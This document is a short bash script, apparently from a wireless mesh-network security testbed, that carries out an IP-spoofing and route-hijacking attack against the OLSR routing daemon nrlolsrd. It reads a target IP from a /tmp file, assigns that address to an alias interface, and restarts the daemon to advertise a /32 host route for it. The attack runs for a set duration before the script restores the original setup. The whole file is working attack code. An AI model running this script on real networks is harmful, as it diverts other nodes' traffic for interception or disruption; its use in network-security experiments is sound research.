startTime=$1
duration=$2

tmpDuration=0
exists=0
hop=2

hostname=`hostname`
filename="/tmp/max"$hostname"_"$hop".txt"
echo "HERE" $filename


sleep $startTime
res=`cat $filename`
if [[ $res != "*No such*" && $res != "" ]] 
	then 
		exists=1
		ipToSpoof=$res
	else 
		exists=0
		echo "noHop_$filename" > /tmp/attack.txt
fi

echo $exists
while [ $tmpDuration -lt $duration -a $exists -eq 0 ]
do
	sleep 1
	tmpDuration=`expr $tmpDuration + 1`

	res=`cat $filename`

	if [[ $res != "*No such*" && $res != "" ]] 
	then 
		exists=1
		ipToSpoof=$res
	else 
		exists=0
		echo "noHop_$filename" > /tmp/attack.txt
	fi
done

pendingDuration=`expr $duration - $tmpDuration`

if [ $pendingDuration -gt 0 ]
then
	echo $filename > /tmp/attack.txt

	ifconfig eth0:1 $ipToSpoof netmask 255.255.255.255 up

	#check if its olsrd running:
	if [ `ps -ef | grep nrlolsrd | wc -l` -gt 1 ]
	then
		echo "HNA $ipToSpoof 32" > tmp.txt
		killall nrlolsrd
		ifconfig eth0:1 $ipToSpoof netmask 255.255.255.255 up
		nrlolsrd -i eth0 -hna tmp.txt &
#		changed to allow the attack for duration regardless of start time
#		sleep $pendingDuration
                sleep $duration
		killall nrlolsrd
		rm tmp.txt
		ifconfig "eth0:1" down
		nrlolsrd -i eth0 &
	else
#		changed to allow the attack for duration regardless of start time
#		sleep $pendingDuration
                sleep $duration
		ifconfig "eth0:1" down
	fi
fi

rm /tmp/attack.txt
